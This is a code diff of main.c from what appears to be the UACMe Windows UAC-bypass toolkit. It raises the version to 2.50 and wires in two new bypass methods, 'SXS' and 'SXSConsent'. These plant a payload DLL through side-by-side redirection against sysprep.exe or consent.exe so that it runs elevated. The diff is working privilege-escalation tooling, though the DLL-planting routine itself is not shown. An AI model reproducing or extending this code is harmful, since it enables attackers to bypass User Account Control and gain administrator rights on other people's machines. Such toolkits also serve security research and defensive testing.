@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.40
+*  VERSION:     2.50
 *
-*  DATE:        01 July 2016
+*  DATE:        06 July 2016
 *
 *  Program entry point.
 *
@@ -20,6 +20,7 @@
 #include "global.h"
 #include <gl\GL.h>
 #pragma comment(lib, "opengl32.lib")
+#pragma comment(lib, "comctl32.lib")
 
 UACMECONTEXT g_ctx;
 
@@ -95,9 +96,12 @@ UINT ucmInit(
         if (FAILED(CoInitialize(NULL)))
             break;
 
+        InitCommonControls();
+
         //fill common data block
         RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
 
+        g_ctx.Flag = AKAGI_FLAG_KILO;
         g_ctx.Peb = NtCurrentPeb();
         inst = g_ctx.Peb->ImageBaseAddress;
 
@@ -112,6 +116,9 @@ UINT ucmInit(
         if (g_ctx.Method == 0 || g_ctx.Method >= UacMethodMax) {
             return ERROR_BAD_ARGUMENTS;
         }
+
+        if (g_ctx.Method == UacMethodSXS)
+            g_ctx.Flag = AKAGI_FLAG_TANGO;
 
 #ifndef _DEBUG
         ElevType = TokenElevationTypeDefault;
@@ -227,9 +234,9 @@ UINT ucmInit(
         case UacMethodAVrf:
             dwType = HIBIKI_ID;
             break;
-       /* case UacMethod21:
-            dwType = HATSUYUKI_ID;
-            break;*/
+        case UacMethodSXSConsent:
+            dwType = IKAZUCHI_ID;
+            break;
         default:
             dwType = FUBUKI_ID;
             break;
@@ -484,6 +491,23 @@ UINT ucmMain()
 #else
 #endif
         break;
+
+    case UacMethodSXS:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
+    case UacMethodSXSConsent: //for smehuechki
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
     }
 
     //prepare command for payload
@@ -693,6 +717,20 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
+
+    case UacMethodSXS:
+        if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, SYSPREP_DIR, SYSPREP_EXE, NULL, FALSE)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodSXSConsent:
+        if (MessageBox(GetDesktopWindow(), TEXT("WARNING: This method will affect UAC interface, are you sure?"), PROGRAMTITLE, MB_YESNO) == IDYES) {
+            if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, NULL, CONSENT_EXE, EVENTVWR_EXE, TRUE)) {
+                return ERROR_SUCCESS;
+            }
+        }
+        break;
 #endif
 
     }
@@ -702,5 +740,5 @@ UINT ucmMain()
 
 VOID main()
 {
-    ExitProcess(ucmMain());
+     ExitProcess(ucmMain());
 }
